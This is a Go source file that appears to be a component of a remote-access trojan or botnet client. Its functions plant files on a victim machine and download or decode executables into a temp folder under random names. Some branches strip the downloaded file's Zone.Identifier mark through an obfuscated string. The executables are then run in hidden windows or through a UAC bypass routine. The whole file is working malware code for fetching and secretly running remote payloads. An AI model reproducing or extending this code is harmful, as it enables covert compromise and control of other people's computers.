package components

//Add UAC Bypass support
import (
	"encoding/base64"
	"io"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"syscall"
)

func filePush(mod, file, name, drop string) { //Plants file on system, with custom drop location and name
	if mod == "0" { //File is a Base 64 String
		mkFile, _ := os.Create(deobfuscate(drop) + deobfuscate(name))
		decodeFile, _ := base64.StdEncoding.DecodeString(file)
		mkFile.WriteString(string(decodeFile))
		mkFile.Close()
	} else { //Must download the file
		output, _ := os.Create(deobfuscate(drop) + deobfuscate(name))
		defer output.Close()
		response, _ := http.Get(file)
		defer response.Body.Close()
		_, err := io.Copy(output, response.Body)
		if err != nil {
		}
	}
}

func downloadAndRun(mod string, file string, MD5 string, uac string, Parameters string) {
	if mod == "0" {
		if MD5 != "false" {
			n := randomString(5, false)
			Binary, _ := os.Create(tmpPath + n + ".exe")
			DecodedBinary, _ := base64.StdEncoding.DecodeString(file)
			Binary.WriteString(string(DecodedBinary))
			Binary.Close()
			if string(computeMD5(tmpPath+n+".exe")) == MD5 {
				if uac == "0" {
					Command := string(tmpPath + n + ".exe" + " " + Parameters)
					Exec := exec.Command("cmd", "/C", Command)
					Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
					Exec.Start()
				} else {
					uacBypass(tmpPath + n + ".exe" + " " + Parameters)
				}
			} else {
				NewDebugUpdate("Download and Run File Currupted")
			}
		} else {
			n := randomString(5, false)
			Binary, _ := os.Create(tmpPath + n + ".exe")
			DecodedBinary, _ := base64.StdEncoding.DecodeString(file)
			Binary.WriteString(string(DecodedBinary))
			Binary.Close()
			if uac == "0" {
				Command := string(tmpPath + n + ".exe" + " " + Parameters)
				Exec := exec.Command("cmd", "/C", Command)
				Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
				Exec.Start()
			} else {
				uacBypass(tmpPath + n + ".exe" + " " + Parameters)
			}
		}
	} else if mod == "1" {
		if strings.Contains(file, "http://") {
			if MD5 != "false" {
				n := randomString(5, false)
				output, _ := os.Create(tmpPath + n + ".exe")
				defer output.Close()
				response, _ := http.Get(file)
				defer response.Body.Close()
				_, err := io.Copy(output, response.Body)
				if err != nil {
				}
				_ = os.Remove(tmpPath + n + deobfuscate("/fyf;[pof/Jefoujgjfs"))
				if string(computeMD5(tmpPath+n+".exe")) == MD5 {
					if uac == "0" {
						Command := string(tmpPath + n + ".exe" + " " + Parameters)
						Exec := exec.Command("cmd", "/C", Command)
						Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
						Exec.Start()
					} else {
						uacBypass(tmpPath + n + ".exe")
					}
				} else {
					NewDebugUpdate("Download and Run File Currupted")
				}
			} else {
				n := randomString(5, false)
				output, _ := os.Create(tmpPath + n + ".exe")
				defer output.Close()
				response, _ := http.Get(file)
				defer response.Body.Close()
				_, err := io.Copy(output, response.Body)
				if err != nil {
				}
				_ = os.Remove(tmpPath + n + deobfuscate("/fyf;[pof/Jefoujgjfs"))
				if uac == "0" {
					//run("start " + tmpPath + n + ".exe")
					Command := string(tmpPath + n + ".exe" + " " + Parameters)
					Exec := exec.Command("cmd", "/C", Command)
					Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
					Exec.Start()
				} else {
					uacBypass(tmpPath + n + ".exe")
				}
			}
		}
	}
}
